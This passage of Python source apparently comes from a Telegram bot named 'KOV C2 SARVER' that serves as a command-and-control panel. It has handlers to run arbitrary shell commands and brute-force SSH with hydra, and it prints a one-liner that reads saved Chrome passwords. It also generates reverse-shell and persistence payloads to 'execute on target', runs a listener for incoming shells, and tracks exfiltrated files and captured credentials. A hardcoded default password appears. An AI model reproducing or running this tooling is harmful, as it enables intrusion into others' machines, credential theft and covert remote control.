    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    admins = get_admins()
    msg = (
        f"{BOX}\n"
        f"ðŸ‘¥ *ADMINISTRATORS*\n"
        f"{BOX}\n"
    )
    for aid in admins:
        nickname = get_user_nickname(aid) or "Unknown"
        tag = " ðŸ‘‘ OWNER" if aid == ADMIN_ID else ""
        msg += f"  â€¢ `{aid}` ({nickname}){tag}\n"
    msg += f"\nTotal: `{len(admins)}`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def ban_list_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    banned = get_banned()
    if not banned:
        await update.message.reply_text("âœ… *No users are banned.*", parse_mode=ParseMode.MARKDOWN)
        return
    msg = (
        f"{BOX}\n"
        f"ðŸš« *BANNED USERS*\n"
        f"{BOX}\n"
    )
    for bid in banned:
        nickname = get_user_nickname(bid) or "Unknown"
        msg += f"  â€¢ `{bid}` ({nickname})\n"
    msg += f"\nTotal: `{len(banned)}`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def users_list_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    users = get_users()
    if not users:
        await update.message.reply_text("ðŸ“­ *No users registered.*", parse_mode=ParseMode.MARKDOWN)
        return
    msg = (
        f"{BOX}\n"
        f"ðŸ‘¤ *REGISTERED USERS*\n"
        f"{BOX}\n"
    )
    for u in users:
        admin_tag = " ðŸ‘‘" if is_owner(u['user_id']) else " ðŸ›¡ï¸" if is_admin(u['user_id']) else ""
        banned_tag = " ðŸš«" if is_banned(u['user_id']) else ""
        msg += (
            f"\nâ€¢ `{u['user_id']}` ({u['nickname']}){admin_tag}{banned_tag}\n"
            f"  â”œ First: `{u['first_seen'][:19]}`\n"
            f"  â”” Last: `{u['last_seen'][:19]}`\n"
        )
    msg += f"\nTotal: `{len(users)}`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def reset_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    
    keyboard = [
        [InlineKeyboardButton("âœ… YES, RESET EVERYTHING", callback_data="reset_confirm")],
        [InlineKeyboardButton("âŒ NO, CANCEL", callback_data="admin_cancel")]
    ]
    await update.message.reply_text(
        f"{BOX}\nâš ï¸ *WARNING: RESET BOT*\n{BOX}\n\n"
        f"This will:\n"
        f"â€¢ Delete ALL targets, sessions, commands, files\n"
        f"â€¢ Remove ALL admins except owner\n"
        f"â€¢ Clear ALL banned users\n"
        f"â€¢ Reset password to `d4rk123`\n"
        f"â€¢ Delete ALL registered users\n\n"
        f"Are you sure?",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def reset_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied*", parse_mode=ParseMode.MARKDOWN)
        return
    
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM targets")
    c.execute("DELETE FROM sessions")
    c.execute("DELETE FROM commands")
    c.execute("DELETE FROM files")
    c.execute("DELETE FROM credentials")
    conn.commit()
    conn.close()
    
    save_json(ADMINS_PATH, [ADMIN_ID])
    save_json(BANNED_PATH, [])
    save_json(USERS_PATH, [])
    save_json(LOGS_PATH, [])
    save_json(NOTIFIED_PATH, [])
    set_password("d4rk123")
    
    add_log("bot_reset", user_id, details="Bot fully reset by owner")
    
    await query.edit_message_text(
        f"{BOX}\nâœ… *BOT RESET COMPLETE*\n{BOX}\n\n"
        f"â€¢ All data cleared\n"
        f"â€¢ Only owner retained as admin\n"
        f"â€¢ Password reset to: `d4rk123`\n"
        f"â€¢ All users removed\n\n"
        f"Restart the bot and re-login.",
        parse_mode=ParseMode.MARKDOWN
    )

async def targets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    
    if not rows:
        await update.message.reply_text("ðŸ“­ *No targets registered.*\nUse /addtarget to add one.", parse_mode=ParseMode.MARKDOWN)
        return
    
    msg = (
        f"{BOX}\n"
        f"ðŸŽ¯ *KOV C2 TARGETS*\n"
        f"{BOX}\n"
    )
    for row in rows:
        status_icon = "ðŸŸ¢" if row['status'] == 'active' else "ðŸ”´"
        msg += (
            f"\n{status_icon} *ID:* `{row['id']}`\n"
            f"  â”œ Hostname: `{row['hostname']}`\n"
            f"  â”œ IP: `{row['ip']}`\n"
            f"  â”œ OS: `{row['os'] or 'Unknown'}`\n"
            f"  â”” Last Seen: `{row['last_seen']}`\n"
        )
    
    keyboard = []
    for row in rows[:10]:
        keyboard.append([InlineKeyboardButton(f"ðŸŽ¯ {row['hostname']} ({row['ip']})", callback_data=f"target:{row['id']}")])
    keyboard.append([InlineKeyboardButton("ðŸ”™ MAIN MENU", callback_data="menu_back")])
    
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def add_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addtarget <hostname> <ip>")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO targets (hostname, ip) VALUES (?, ?)", (context.args[0], context.args[1]))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"âœ… *Target added:* `{context.args[0]}` ({context.args[1]})", parse_mode=ParseMode.MARKDOWN)

async def remove_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /removetarget <target_id>")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM targets WHERE id = ?", (context.args[0],))
    c.execute("DELETE FROM sessions WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM commands WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM files WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM credentials WHERE target_id = ?", (context.args[0],))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"âœ… *Target `{context.args[0]}` removed*", parse_mode=ParseMode.MARKDOWN)

async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /shell <target_id>")
        return
    target_id = context.args[0]
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
    target = c.fetchone()
    conn.close()
    if not target:
        await update.message.reply_text("âŒ Target not found.")
        return
    context.user_data['shell_target'] = target_id
    await update.message.reply_text(
        f"ðŸ’» *Interactive Shell - {target['hostname']}*\n"
        f"Send commands directly. Use `exit` to close.\n"
        f"{BOX}\n"
        f"`{target['hostname']} $ `",
        parse_mode=ParseMode.MARKDOWN
    )

async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /cmd <target_id> <command>")
        return
    target_id = context.args[0]
    command = ' '.join(context.args[1:])
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[No output]"
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO commands (target_id, command, output, status, executed_at) VALUES (?, ?, ?, 'completed', datetime('now'))", (target_id, command, output[:5000]))
        conn.commit()
        conn.close()
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text(
            f"ðŸ’» *Command Executed*\n`$ {command}`\n\n```\n{output}\n```",
            parse_mode=ParseMode.MARKDOWN
        )
    except subprocess.TimeoutExpired:
        await update.message.reply_text("â° *Command timed out*", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"âŒ *Error:* `{str(e)}`", parse_mode=ParseMode.MARKDOWN)

async def custom_cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return ConversationHandler.END
    await update.message.reply_text("âœï¸ *Send the command you want to execute:*", parse_mode=ParseMode.MARKDOWN)
    return CUSTOM_CMD

async def custom_cmd_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
    output = result.stdout + result.stderr
    if not output:
        output = "[No output]"
    if len(output) > 3500:
        output = output[:3500] + "\n\n...[truncated]..."
    await update.message.reply_text(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ðŸš« *Cancelled*", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /scan <target_id> [ports]\nExample: /scan 1 1-1000")
        return
    target_id = context.args[0]
    ports = context.args[1] if len(context.args) > 1 else "1-1024"
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
    target = c.fetchone()
    conn.close()
    if not target:
        await update.message.reply_text("âŒ Target not found.")
        return
    await update.message.reply_text(f"ðŸ” *Scanning {target['ip']}:{ports}...*", parse_mode=ParseMode.MARKDOWN)
    results = network_scan(target['ip'], ports)
    if not results:
        await update.message.reply_text("ðŸ“­ *No open ports found*", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"ðŸ” *Scan Results - {target['ip']}*\n{BOX}\n"
    for r in results[:30]:
        msg += f"  â”œ PORT `{r['port']}` - {r['service']} ({r['state']})\n"
    if len(results) > 30:
        msg += f"  â”” ... and {len(results)-30} more ports\n"
    else:
        msg += "  â”” Scan complete\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def nmap_wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /nmap <target> [args]\nExample: /nmap 192.168.1.1 -sV -p 80,443")
        return
    target = context.args[0]
    args = ' '.join(context.args[1:]) if len(context.args) > 1 else '-sS -sV -O'
    await update.message.reply_text(f"ðŸ” *Running nmap on {target}...*", parse_mode=ParseMode.MARKDOWN)
    try:
        result = subprocess.run(f"nmap {args} {target}", shell=True, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    except FileNotFoundError:
        await update.message.reply_text("âŒ nmap not installed. Install: `pkg install nmap` or `apt install nmap`", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"âŒ *Error:* `{str(e)}`", parse_mode=ParseMode.MARKDOWN)

async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /osint <target>")
        return
    target = context.args[0]
    await update.message.reply_text(f"ðŸ” *Gathering OSINT on {target}...*", parse_mode=ParseMode.MARKDOWN)
    results = []
    try:
        ip = socket.gethostbyname(target)
        results.append(f"  â”œ IP: `{ip}`")
    except:
        pass
    for proto in ['https', 'http']:
        try:
            r = requests.get(f"{proto}://{target}", timeout=10, verify=False)
            h = dict(r.headers)
            results.append(f"  â”œ {proto.upper()} Server: `{h.get('Server', 'N/A')}`")
            results.append(f"  â”œ {proto.upper()} Tech: `{h.get('X-Powered-By', 'N/A')}`")
            break
        except:
            pass
    if not results:
        results.append("  â”” No OSINT data found")
    msg = f"ðŸ” *OSINT Results - {target}*\n{BOX}\n" + "\n".join(results)
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /listfiles <target_id>")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM files WHERE target_id = ? ORDER BY exfiltrated_at DESC", (context.args[0],))
    files = c.fetchall()
    conn.close()
    if not files:
        await update.message.reply_text("ðŸ“­ *No files for this target*", parse_mode=ParseMode.MARKDOWN)
        return
    msg = "ðŸ“ *Exfiltrated Files*\n" + BOX + "\n"
    for f in files:
        size_str = f"{f['size']/1024:.1f} KB" if f['size'] else "Unknown"
        msg += f"\nðŸ“„ `{f['filename']}`\n  â”œ Size: {size_str}\n  â”” Date: `{f['exfiltrated_at']}`\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def upload_file_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return ConversationHandler.END
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /upload <target_id>\nThen send the file")
        return ConversationHandler.END
    context.user_data['upload_target'] = context.args[0]
    await update.message.reply_text("ðŸ“¤ *Send the file to upload*", parse_mode=ParseMode.MARKDOWN)
    return FILE_UPLOAD

async def upload_file_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document or (update.message.photo[-1] if update.message.photo else None)
    if not file:
        await update.message.reply_text("âŒ Send a file (document or photo)")
        return FILE_UPLOAD
    target_id = context.user_data.get('upload_target')
    if not target_id:
        await update.message.reply_text("âŒ No target selected")
        return ConversationHandler.END
    file_obj = await file.get_file()
    save_path = Path.home() / "d4rk_exfil" / target_id
    save_path.mkdir(parents=True, exist_ok=True)
    filename = getattr(file, 'file_name', None) or f"file_{int(time.time())}"
    local_file = save_path / filename
    await file_obj.download_to_drive(local_file)
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO files (target_id, filename, filepath, size) VALUES (?, ?, ?, ?)", (target_id, filename, str(local_file), os.path.getsize(local_file)))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"âœ… *File saved:* `{filename}`\nðŸ“ *Path:* `{str(local_file)}`", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /keylogger <target_id>")
        return
    await update.message.reply_text("âŒ¨ï¸ *Keylogger Simulated*\n(On real target: deploys keylogger via reverse shell)\nUse /cmd to execute on target.", parse_mode=ParseMode.MARKDOWN)

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /screenshot <target_id>")
        return
    await update.message.reply_text("ðŸ“¸ *Taking screenshot...*", parse_mode=ParseMode.MARKDOWN)
    try:
        img_path = f"/tmp/d4rk_ss_{int(time.time())}.png"
        result = subprocess.run(["scrot", img_path], capture_output=True, timeout=10)
        if os.path.exists(img_path):
            with open(img_path, 'rb') as f:
                await update.message.reply_photo(photo=InputFile(f, filename="screenshot.png"), caption="ðŸ“¸ *Screenshot captured*", parse_mode=ParseMode.MARKDOWN)
            os.remove(img_path)
        else:
            await update.message.reply_text("âŒ *Screenshot failed* - no display found.\nInstall: `pkg install scrot`", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text("âŒ *Screenshot not available*\nInstall: `pkg install scrot`", parse_mode=ParseMode.MARKDOWN)

async def persistence(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /persistence <target_id>")
        return
    await update.message.reply_text(
        f"ðŸ”— *Persistence Script Generated*\n```\n{generate_persistence_script()}\n```\nReplace LHOST and LPORT before deploying.",
        parse_mode=ParseMode.MARKDOWN
    )

async def browserpass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /browserpass <target_id>")
        return
    await update.message.reply_text(
        "ðŸ”‘ *Browser Password Extraction*\nTo extract from target, run via /cmd:\n\n"
        "*Chrome/Linux:*\n```\npython3 -c \"import sqlite3,os; p=os.path.expanduser('~/.config/google-chrome/Default/Login Data'); c=sqlite3.connect(p); for r in c.execute('SELECT origin_url,username_value,password_value FROM logins'): print(r)\"\n```\n"
        "*Firefox:*\n```\nls ~/.mozilla/firefox/*.default-release/logins.json\n```",
        parse_mode=ParseMode.MARKDOWN
    )

async def wifi_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /wifi <target_id>")
        return
    await update.message.reply_text("ðŸ“¶ *Enumerating WiFi networks...*", parse_mode=ParseMode.MARKDOWN)
    try:
        result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            output = result.stdout[:3500]
        else:
            result = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=10)
            output = result.stdout[:3500] if result.stdout else "No WiFi interfaces found"
    except:
        output = "WiFi enumeration requires nmcli or iwlist"
    await update.message.reply_text(f"ðŸ“¶ *WiFi Networks*\n```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)

async def brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /brute <target> <username> <wordlist_path>\n"
            "Example: /brute 192.168.1.1 root /usr/share/wordlists/rockyou.txt",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    target_ip = context.args[0]
    username = context.args[1]
    wordlist = context.args[2] if len(context.args) > 2 else "/usr/share/wordlists/rockyou.txt"
    await update.message.reply_text(
        f"ðŸ”¨ *Brute Force Attack*\n"
        f"Target: `{target_ip}`\n"
        f"Username: `{username}`\n"
        f"Wordlist: `{wordlist}`\n\n"
        f"âš™ï¸ Starting...\n*(Use hydra or medusa for real brute force)*",
        parse_mode=ParseMode.MARKDOWN
    )
    try:
        result = subprocess.run(
            f"hydra -l {username} -P {wordlist} ssh://{target_ip} -t 4 -V",
            shell=True, capture_output=True, text=True, timeout=30
        )
        output = result.stdout + result.stderr
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    except FileNotFoundError:
        await update.message.reply_text("âŒ hydra not installed.\nInstall: `pkg install hydra` or `apt install hydra`", parse_mode=ParseMode.MARKDOWN)
    except subprocess.TimeoutExpired:
        await update.message.reply_text("â° *Brute force timed out*", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"âŒ *Error:* `{str(e)}`", parse_mode=ParseMode.MARKDOWN)

async def listener(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    port = int(context.args[0]) if context.args else 4444
    if context.bot_data.get('listener_running'):
        await update.message.reply_text(
            f"ðŸ”´ *Listener already running on port {context.bot_data.get('listener_port')}*\n"
            f"Use /stoplistener to stop it.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    await update.message.reply_text(
        f"ðŸŽ§ *Starting listener on port {port}...*\n"
        f"Use /payload to generate a reverse shell.",
        parse_mode=ParseMode.MARKDOWN
    )
    def start_listener():
        context.bot_data['listener_running'] = True
        context.bot_data['listener_port'] = port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(('0.0.0.0', port))
            server.listen(5)
            server.settimeout(1.0)
            while context.bot_data.get('listener_running'):
                try:
                    client, addr = server.accept()
                    t = threading.Thread(target=handle_connection, args=(client, addr, context))
                    t.daemon = True
                    t.start()
                except socket.timeout:
                    continue
                except:
                    break
        except Exception as e:
            print(f"[Listener Error] {e}")
        finally:
            server.close()
            context.bot_data['listener_running'] = False
    t = threading.Thread(target=start_listener, daemon=True)
    t.start()
    context.bot_data['listener_thread'] = t

def handle_connection(client, addr, context):
    print(f"[+] Connection from {addr}")
    client.send(b"KOV C2 Shell\n> ")
    try:
        while True:
            data = client.recv(4096)
            if not data:
                break
            output = data.decode('utf-8', errors='replace')
            print(f"[Shell Output] {output}")
    except:
        pass
    finally:
        client.close()
        print(f"[-] Connection closed: {addr}")

async def stop_listener(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if context.bot_data.get('listener_running'):
        context.bot_data['listener_running'] = False
        await update.message.reply_text("â¹ï¸ *Listener stopped*", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("ðŸ“­ *No listener running*", parse_mode=ParseMode.MARKDOWN)

async def payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /payload <lhost> <lport> [os]\n"
            "OS options: linux (default), windows\n"
            "Example: /payload 192.168.1.100 4444 linux",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    lhost = context.args[0]
    lport = int(context.args[1])
    os_type = context.args[2] if len(context.args) > 2 else "linux"
    shell_code = generate_reverse_shell(lhost, lport, os_type)
    await update.message.reply_text(
        f"ðŸ’‰ *Reverse Shell Payload*\n"
        f"LHOST: `{lhost}`\n"
        f"LPORT: `{lport}`\n"
        f"OS: `{os_type}`\n\n"
        f"```\n{shell_code}\n```\n\n"
        f"ðŸ“‹ Copy and execute on target.",
        parse_mode=ParseMode.MARKDOWN
    )

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    s_info = get_system_info()
    msg = (
        f"{BOX}\n"
        f"ðŸ–¥ *KOV C2 SYSTEM INFO*\n"
        f"{BOX}\n"
        f"*Hostname:* `{s_info['hostname']}`\n"
        f"*OS:* `{s_info['platform']} {s_info['platform_release']}`\n"
        f"*Arch:* `{s_info['architecture']}`\n"
        f"*IP:* `{s_info['ip']}`\n"
        f"*CPU:* `{s_info['cpu_count']} cores`\n"
        f"*RAM:* `{s_info['memory']} ({s_info['memory_used']})`\n"
        f"*Disk:* `{s_info['disk']} ({s_info['disk_used']})`\n"
        f"*Python:* `{s_info['python_version'][:30]}...`\n"
        f"*Uptime:* `{s_info['uptime']}`\n"
        f"{BOX}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM targets WHERE status='active'")
    active_targets = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM targets")
    total_targets = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM sessions WHERE active=1")
    active_sessions = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'")
    pending_cmds = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM files")
    total_files = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM credentials")
    total_creds = c.fetchone()[0]
    conn.close()
    listener_status = "ðŸŸ¢ Running" if context.bot_data.get('listener_running') else "ðŸ”´ Stopped"
    listener_port = context.bot_data.get('listener_port', 'N/A')
    msg = (
        f"{BOX}\n"
        f"ðŸ“Š *KOV C2 STATUS*\n"
        f"{BOX}\n"
        f"ðŸŽ¯ Active Targets: `{active_targets}/{total_targets}`\n"
        f"ðŸ’» Active Sessions: `{active_sessions}`\n"
        f"â³ Pending Commands: `{pending_cmds}`\n"
        f"ðŸ“ Exfiltrated Files: `{total_files}`\n"
        f"ðŸ”‘ Captured Credentials: `{total_creds}`\n"
        f"ðŸŽ§ Listener: {listener_status} (port {listener_port})\n"
        f"{BOX}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM commands WHERE executed_at < datetime('now', '-7 days')")
    c.execute("DELETE FROM files WHERE exfiltrated_at < datetime('now', '-7 days')")
    c.execute("DELETE FROM credentials WHERE captured_at < datetime('now', '-7 days')")
    conn.commit()
    conn.close()
    await update.message.reply_text("ðŸ§¹ *Old data cleaned!* (Deleted entries older than 7 days)", parse_mode=ParseMode.MARKDOWN)

async def update_self(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    await update.message.reply_text("ðŸ”„ *KOV C2 is up to date* (local version)", parse_mode=ParseMode.MARKDOWN)

ADMIN_ACTION_STATE = range(1)

async def admin_action_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END

    data = query.data
    action_map = {
        "admin_add": ("ðŸ‘¥ *Add Admin*\n\nSend the Telegram user ID to add as admin:", "add"),
        "admin_remove": ("ðŸ—‘ *Remove Admin*\n\nSend the Telegram user ID to remove from admins:", "remove"),
        "admin_ban": ("ðŸš« *Ban User*\n\nSend the Telegram user ID to ban:", "ban"),
        "admin_unban": ("âœ… *Unban User*\n\nSend the Telegram user ID to unban:", "unban"),
    }

    if data in action_map:
        msg, action_type = action_map[data]
        context.user_data['admin_action_type'] = action_type
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return ADMIN_ACTION_STATE

    return ConversationHandler.END

async def admin_action_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied*", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END

    action_type = context.user_data.get('admin_action_type')
    text = update.message.text.strip()

    try:
        target_id = int(text)
    except ValueError:
        await update.message.reply_text("âŒ *Invalid ID.* Please send a numeric Telegram user ID.", parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return ADMIN_ACTION_STATE

    if action_type == "add":
        if add_admin(target_id):
            await update.message.reply_text(f"âœ… *Admin Added*\nUser ID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_added", user_id, target_id)
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=(
                        f"{BOX}\n"
                        f"ðŸŽ‰ *You have been promoted*\n"
                        f"{BOX}\n\n"
                        f"*Role:* Administrator\n\n"
                        f"You now have full access to KOV C2 SARVER.\n"
                        f"Use /start to begin."
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
            await notify_admins(
                context,
                f"{BOX}\nðŸ”” *User Promoted*\n{BOX}\n\nðŸ‘¤ Username: @{update.effective_user.username or 'N/A'}\nðŸ†” ID: `{target_id}`\n\nNew administrator added.",
                ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is already an admin.", parse_mode=ParseMode.MARKDOWN)

    elif action_type == "remove":
        if target_id == ADMIN_ID:
            await update.message.reply_text("âŒ Cannot remove the owner.", parse_mode=ParseMode.MARKDOWN)
        elif remove_admin(target_id):
            await update.message.reply_text(f"âœ… *Admin Removed*\nUser ID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_removed", user_id, target_id)
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=(
                        f"{BOX}\n"
                        f"âš  *Administrator role removed.*\n"
                        f"{BOX}\n\n"
                        f"You no longer have administrator access to KOV C2 SARVER."
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
        else:
